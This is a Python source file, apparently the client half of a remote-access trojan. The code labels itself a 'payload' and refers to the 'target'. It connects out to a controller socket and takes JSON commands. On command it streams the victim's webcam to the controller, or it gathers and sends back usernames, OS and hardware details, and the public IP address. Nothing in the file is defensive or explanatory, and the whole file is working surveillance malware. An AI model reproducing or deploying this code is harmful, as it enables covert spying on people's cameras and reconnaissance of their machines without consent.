import json
import socket
import time, sys, os
import platform
import requests
import json
import threading

HOST = socket.gethostbyname(socket.gethostname())
PORT = 9887
CameraStreamingPort = 8989

try:
    from vidstream import CameraClient
except:
    os.system("pip install vidstream >> intall.txt && rm install.txt")
    from vidstream import CameraClient
try:
    import colorama
except:
    os.system("pip3 install colorama >> install.txt && rm install.txt")
    import colorama

#colors
class colors (object):
    def red():
        return colorama.Fore.RED
    def green():
        return colorama.Fore.GREEN
    def blue():
        return colorama.Fore.BLUE
    def white():
        return colorama.Fore.WHITE
    def yellow():
        return colorama.Fore.YELLOW
    def black():
        return colorama.Fore.BLACK
#init the colors
CR = colors
#symbols
Splus = f"{CR.red()}|<{CR.green()}+{CR.red()}>|{CR.white()}"
Sminess = f"{CR.red()}|<{CR.yellow()}-{CR.red()}>|{CR.white()}"
Swarning = f"{CR.red()}<|{CR.yellow()}!{CR.red()}>|{CR.white()}"
Ssowrd = f"{CR.red()} ==> {CR.white()}"
#platform info
def GettingInfoOfTheSystem(__server__): #it worke
    ALL_INFO = {
            "target_user_name" : "",
            "platform" : platform.system(),
            "machine" : platform.machine(),
            "node" : platform.node(),
            "architecture" : f"{platform.architecture()[0]} | {platform.architecture()[1]}",
            "version" : platform.version(),
            "processor" : platform.processor(),
            "release" : platform.release(),
            "host ip" : socket.gethostbyname(socket.gethostname()),
            "ip" : requests.get('https://api.ipify.org?format=json').json()["ip"]
            }
    """
        trying to get 
        the target user name
    """
    if platform.system() == 'Linux':
        NAME = os.listdir("/home")
        LIST_NAMES = "|"
        for x in NAME:
            LIST_NAMES += f" {x} |"
        ALL_INFO["target_user_name"] = LIST_NAMES
    elif platform.system() == "Windows" :
        ALL_INFO["target_user_name"] = os.getlogin()

    WHAT_TO_SEND = json.dumps(ALL_INFO)
    __server__.send(WHAT_TO_SEND.encode())

#the CameraStreaming function
def StartCameraStreaming(host, port):
    global CAMERA_STREAMING    
    CAMERA_STREAMING = CameraClient(host, port)
    CAMERA_STREAMING_THREAD = threading.Thread(
                    target=CAMERA_STREAMING.start_stream()
            )
    CAMERA_STREAMING_THREAD.start()
def StopCameraStreaming() :
    CAMERA_STREAMING.stop_stream()
    
#the run function for the payload
def SocketThing(host, port, camera_streaming_port):
    STATIC = False
    SERVER_TO_CONNECT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SERVER_TO_CONNECT.connect((host,port))
    while True:
        DATA_RECV = SERVER_TO_CONNECT.recv(99999).decode()
        JSON_READ_MSG = json.loads(DATA_RECV)
        if JSON_READ_MSG["command"] == "start stream":
            StartCameraStreaming(
                host=host,
                port=camera_streaming_port
            )
            SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
        elif JSON_READ_MSG["command"]== "stop stream":
            time.sleep(0.3)
            StopCameraStreaming()
        elif JSON_READ_MSG["command"] == "get info":
            GettingInfoOfTheSystem(
                __server__=SERVER_TO_CONNECT
            )
        elif JSON_READ_MSG["command"] == "stop connection":
            SERVER_TO_CONNECT.close()
            sys.exit()

SocketThing(
    host =  HOST,
    port = PORT,
    camera_streaming_port = CameraStreamingPort
)